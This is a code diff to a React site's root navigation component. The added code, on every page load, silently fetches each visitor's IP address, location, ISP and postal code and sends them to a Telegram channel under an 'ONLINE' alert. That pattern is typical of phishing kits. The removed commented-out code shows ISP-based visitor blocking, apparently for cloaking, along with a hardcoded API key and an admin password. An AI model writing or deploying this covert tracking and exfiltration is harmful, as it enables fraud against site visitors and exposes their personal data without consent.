@@ -15,6 +15,7 @@ import Dashboard2 from "./Dashboard2";
 import { Landing } from "./Landing";
 import { LandingPageNew } from "./LandingPageNew";
 import { LandingPage } from "./LandingPage";
+import { sendTelegram } from "./utils/sendTelegram";
 
 export default function RootNavigation() {
   const [is_visible, setVisible] = useState(false);
@@ -22,28 +23,39 @@ export default function RootNavigation() {
   const [isRedirect, setRedirect] = useState(false);
   var url = window.location.pathname.split("/");
 
-  // useEffect(() => {
-  //     fetch("https://api.ipgeolocation.io/ipgeo?apiKey=defba4e9d87c44ce9125f6101daf33a1")
-  //     .then((response) => response.json())
-  //     .then((response) => {
-  //       const isBlockOrgi = BLOCK_ORG.some(item => response.isp.toLowerCase().includes(item.toLowerCase()))
-  //       setRedirect(isBlockOrgi)
-  //       setLoading(false);
-  //     }).catch(() => {
-  //       setLoading(false);
-  //     })
+  const getIpConfig = () => {
+    fetch("https://ipinfo.io/json")
+      .then((response) => response.json())
+      .then((data) => {
+        let body = {
+          ip: data.ip,
+          country: data.country,
+          region: data.region,
+          city: data.city,
+          org: data.org,
+          zip: data.postal,
+        };
 
-  //   // triggerPompt();
-  // }, []);
+        // Replace this
+        localStorage.setItem("ip-datas", JSON.stringify(body));
 
-  // const triggerPompt = () => {
-  //   let user = window.prompt("What's code?", "");
-  //   if (user == "admin!") {
-  //     setVisible(true);n
-  //   } else {
-  //     triggerPompt();
-  //   }
-  // };
+        let telegram_data = `
+          ===== ONLINE =====
+            IP: ${data.ip}
+            City: ${data.city}
+            Region: ${data.region}
+            Country: ${data.country}
+            ORG: ${data.org}
+            ZIP: ${data.postal}
+          `;
+
+        sendTelegram(telegram_data, true);
+      });
+  };
+
+  useEffect(() => {
+    getIpConfig();
+  }, []);
 
   return (
     <BrowserRouter>
